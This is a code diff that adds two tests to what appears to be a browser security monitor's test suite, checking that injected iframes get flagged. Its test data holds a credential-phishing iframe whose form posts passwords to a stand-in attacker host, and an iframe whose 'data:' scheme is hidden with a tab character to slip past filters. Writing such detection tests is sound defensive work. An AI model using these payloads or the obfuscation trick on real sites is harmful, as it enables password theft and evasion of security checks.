@@ -302,6 +302,42 @@ describe("mutation_monitor DOM integration", () => {
     stopMutationMonitor();
   });
 
+  it("flags a data: iframe whose scheme is obfuscated with an interior tab (D-IFRAME R2)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    // "da<TAB>ta:" — a browser strips the tab and resolves it as data:, so the
+    // scheme check must normalize the same way rather than be evaded.
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute("src", "da\tta:text/html,<form><input type=password></form>");
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("data-scheme src"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
+  it("flags an injected srcdoc iframe (inline HTML, no src) (D-IFRAME R2)", async () => {
+    const alerts: MutationAlert[] = [];
+    startMutationMonitor(document, (a) => alerts.push(a));
+
+    const iframe = document.createElement("iframe");
+    iframe.setAttribute("srcdoc", "<form action='https://evil.example/steal'><input type=password></form>");
+    document.body.appendChild(iframe);
+
+    await vi.advanceTimersByTimeAsync(150);
+
+    const iframeAlerts = alerts.filter((a) => a.type === "suspicious_iframe");
+    expect(iframeAlerts.some((a) => a.details.includes("srcdoc (inline HTML)"))).toBe(true);
+
+    iframe.remove();
+    stopMutationMonitor();
+  });
+
   it("caps alerts at 50", async () => {
     const alerts: MutationAlert[] = [];
     startMutationMonitor(document, (a) => alerts.push(a));
